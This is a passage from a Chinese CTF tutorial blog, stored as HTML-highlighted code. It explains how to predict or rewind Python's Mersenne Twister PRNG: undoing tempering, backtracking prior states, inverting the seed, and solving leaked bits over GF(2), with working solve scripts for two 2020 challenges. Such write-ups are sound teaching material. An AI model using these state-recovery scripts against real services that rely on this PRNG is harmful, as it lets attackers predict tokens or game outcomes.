operator">==</span> high<span class="token punctuation">:</span>            tmp <span class="token operator">^</span><span class="token operator">=</span> mask            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>            tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>        res <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">&amp;</span>low        state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res        <span class="token keyword">return</span> state<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="vn-招新赛-backtrace">2020 V&amp;N 招新赛 Backtrace</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env/python3</span><span class="token keyword">import</span> randomflag <span class="token operator">=</span> <span class="token string">"flag{"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"}"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目信息很简练，我们需要恢复前四个随机数。我们需要连续的624个随机数才能获得上一组随机数的状态，这里只有1000个随机数，但是之后前4位丢失，而前4位产生的新状态对应第624，625，626，627位随机数的状态，而他们的状态是可逆的。所以不需要完整的连续624个随机数，也可以求解完整的state。代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token comment"># right shift inverse</span><span class="token keyword">def</span> <span class="token function">inverse_right</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>shift<span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits<span class="token operator">//</span>shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp <span class="token operator">&gt;&gt;</span> shift    <span class="token keyword">return</span> tmp<span class="token comment"># right shift with mask inverse</span><span class="token keyword">def</span> <span class="token function">inverse_right_values</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>shift<span class="token punctuation">,</span>mask<span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits<span class="token operator">//</span>shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp<span class="token operator">&gt;&gt;</span>shift <span class="token operator">&amp;</span> mask    <span class="token keyword">return</span> tmp<span class="token comment"># left shift inverse</span><span class="token keyword">def</span> <span class="token function">inverse_left</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>shift<span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits<span class="token operator">//</span>shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp <span class="token operator">&lt;&lt;</span> shift    <span class="token keyword">return</span> tmp<span class="token comment"># left shift with mask inverse</span><span class="token keyword">def</span> <span class="token function">inverse_left_values</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>shift<span class="token punctuation">,</span>mask<span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bits<span class="token operator">//</span>shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> res <span class="token operator">^</span> tmp <span class="token operator">&lt;&lt;</span> shift <span class="token operator">&amp;</span> mask    <span class="token keyword">return</span> tmp<span class="token keyword">def</span> <span class="token function">backtrace</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">0x80000000</span>    low <span class="token operator">=</span> <span class="token number">0x7fffffff</span>    mask <span class="token operator">=</span> <span class="token number">0x9908b0df</span>    state <span class="token operator">=</span> cur    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> state<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token operator">^</span>state<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">397</span><span class="token punctuation">]</span>        <span class="token comment"># recover Y,tmp = Y</span>        <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> high <span class="token operator">==</span> high<span class="token punctuation">:</span>            tmp <span class="token operator">^</span><span class="token operator">=</span> mask            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>            tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>        <span class="token comment"># recover highest bit</span>        res <span class="token operator">=</span> tmp<span class="token operator">&amp;</span>high        <span class="token comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span>        tmp <span class="token operator">=</span> state<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token operator">^</span>state<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">396</span><span class="token punctuation">]</span>        <span class="token comment"># recover Y,tmp = Y</span>        <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> high <span class="token operator">==</span> high<span class="token punctuation">:</span>            tmp <span class="token operator">^</span><span class="token operator">=</span> mask            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>            tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>        res <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">&amp;</span>low        state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res    <span class="token keyword">return</span> state<span class="token keyword">def</span> <span class="token function">recover_state</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">:</span>    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> out<span class="token punctuation">:</span>        i <span class="token operator">=</span> inverse_right<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span>        i <span class="token operator">=</span> inverse_left_values<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0xefc60000</span><span class="token punctuation">)</span>        i <span class="token operator">=</span> inverse_left_values<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x9d2c5680</span><span class="token punctuation">)</span>        i <span class="token operator">=</span> inverse_right<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span>        state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> statef <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>partS <span class="token operator">=</span> recover_state<span class="token punctuation">(</span>c<span class="token punctuation">)</span>state <span class="token operator">=</span> backtrace<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>partS<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token comment"># print(state)</span>prng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>prng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">"flag{"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"}"</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题型4-逆向init">题型4 逆向init</h2><p>其实这一部分还没有出现过类似的题目，这里就我的理解，简单的叙述一下。</p><p>前文分别叙述了，根据输出逆向对应的state，以及根据输出逆向上一组的state。此部分则是根据第一次的state，逆向seed。</p><p>首先看一下，init函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_int32</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span> <span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">:</span>    mt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">624</span>    mt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> seed    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _int32<span class="token punctuation">(</span><span class="token number">1812433253</span> <span class="token operator">*</span> <span class="token punctuation">(</span>mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token keyword">return</span> mt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定位到关键函数<code>mt[i] = _int32(1812433253 * (mt[i - 1] ^ mt[i - 1] &gt;&gt; 30) + i)</code>，可以发现其中的<code>(mt[i - 1] ^ mt[i - 1] &gt;&gt; 30)</code>是可逆的(详见题型1)，注意到<code>_int32</code>其实相当于取低32位，相当于mod2^32。而<code>gcd(1812433253,2**32) == 1</code>于是<code>1812433253</code>存在逆元。那么逆向的过程其实就是模逆操作再组合上题型1的操作，便可以得到seed。代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token keyword">def</span> <span class="token function">_int32</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span> <span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">:</span>    mt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">624</span>    mt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> seed    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _int32<span class="token punctuation">(</span><span class="token number">1812433253</span> <span class="token operator">*</span> <span class="token punctuation">(</span>mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token keyword">return</span> mtseed <span class="token operator">=</span> <span class="token number">2080737669</span><span class="token keyword">def</span> <span class="token function">invert_right</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>shift<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> res    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">//</span>shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> tmp<span class="token operator">^</span>res<span class="token operator">&gt;&gt;</span>shift    <span class="token keyword">return</span> _int32<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">recover</span><span class="token punctuation">(</span>last<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">32</span>    inv <span class="token operator">=</span> invert<span class="token punctuation">(</span><span class="token number">1812433253</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">623</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        last <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>last<span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span>inv<span class="token punctuation">)</span><span class="token operator">%</span>n        last <span class="token operator">=</span> invert_right<span class="token punctuation">(</span>last<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> laststate <span class="token operator">=</span> init<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>recover<span class="token punctuation">(</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> seed<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="扩展题型">扩展题型</h2><p>在题型2中我们采用的黑盒测试的方法，找到了状态和输出的转移矩阵T。这是因为每个状态的二进制位与其输出的随机数的二进制位，存在线性关系。而每次twist后新生成的状态都是前一组状态的线性组合，也就是说任意一组状态都是第一组状态的线性组合。那么由任意一组状态生成的伪随机数的二进制位和第一组状态的二进制位存在线性关系。</p><p>不妨设 初始状态的二进制形式为：</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\t01ff22c8efb7f07e7c.png"></p><p>设19968个伪随机数的MSB(注意这里不要求一定是MSB，可以是随机数的任意二进制位，也不一定要求是19968个随机数，只要能构成19968个二进制位即可)构成的向量为：</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\t0101be2e66851384bf.png"></p><p>于是有在GF(2)上有如下等式,其中X,Z为1 x 19968 的向量，T为19968 x 19968的矩阵：</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\t012a2222f8c412bfe4.png"></p><p>采用题型2中同样的方法，对T进行黑盒测试。即设置X(1,0,0,0,…0)得到Z为T的第一行，遍历所有情况得到T。最后还原出X。</p><h3 id="pwnhub-coinflip2">2020 pwnhub CoinFlip2</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env -S python3 -u</span><span class="token keyword">import</span> randomcount <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Progress: %s/50"</span> <span class="token operator">%</span> count<span class="token punctuation">)</span>    coin <span class="token operator">=</span> random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Your guess: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> coin<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">50</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Wrong!"</span><span class="token punctuation">)</span>        count <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python中的<code>getrandbits(1)</code>其实截取的是<code>getrandbits(32)</code>的最高位即<code>MSB</code>。于是我们需要收集19968个<code>MSB</code>，并构造<code>T</code>，才能还原state。需要注意的是这里构造的<code>T</code>并不是满秩的，但是sage仍然可以求解，不过求解得到的<code>X</code>的前32位，并不正确。但是我们仍然能够得到623位的state，我们可以利用题型3中的方法还原第一位state。进而利用state预测接下来的随机数。不过需要注意的是，构造矩阵<code>T</code>是相当耗费时间的，笔者在2h2g的机器上跑了大约一个多小时，才算出结果。为了读者的方便，这里直接给出矩阵的数据</p><p><a href="https://www.jianguoyun.com/p/Da01v98Q8PO5CBjht5oD">坚果云(需要注册，但速度很快访问密码: badmonkey)</a></p><p><a href="https://share.weiyun.com/jt9VDr2l">腾讯云(密码monkey)</a></p><p>具体代码如下，可以根据需要更改：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /bin/bash/env python3</span><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> random <span class="token keyword">import</span> Random<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdmprng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>length <span class="token operator">=</span> <span class="token number">19968</span><span class="token keyword">def</span> <span class="token function">myState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">624</span>    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> i<span class="token operator">&lt;</span>length<span class="token punctuation">:</span>        ind <span class="token operator">=</span> i<span class="token operator">//</span><span class="token number">32</span>        expont <span class="token operator">=</span> i<span class="token operator">%</span><span class="token number">32</span>        state<span class="token punctuation">[</span>ind<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token operator">-</span>expont<span class="token punctuation">)</span>        s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">yield</span> s        state<span class="token punctuation">[</span>ind<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        i <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">getRow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    gs <span class="token operator">=</span> myState<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>gs<span class="token punctuation">)</span>        rng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#         print(s[1][0])</span>        row <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span>rng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">yield</span> row<span class="token keyword">def</span> <span class="token function">buildBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>length<span class="token punctuation">,</span>length<span class="token punctuation">)</span>    rg <span class="token operator">=</span> getRow<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>rg<span class="token punctuation">)</span>    <span class="token keyword">return</span> b<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    prng <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>    originState <span class="token operator">=</span> prng<span class="token punctuation">.</span>getstate<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 这里都是用的MSB,如果采用不同的二进制位(如LSB)最后的矩阵T 也会不同</span>    leak <span class="token operator">=</span> vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span>prng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> buildBox<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"Matrix"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>nrows<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>ncols<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"n"</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> b<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span><span class="token punctuation">)</span>    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token 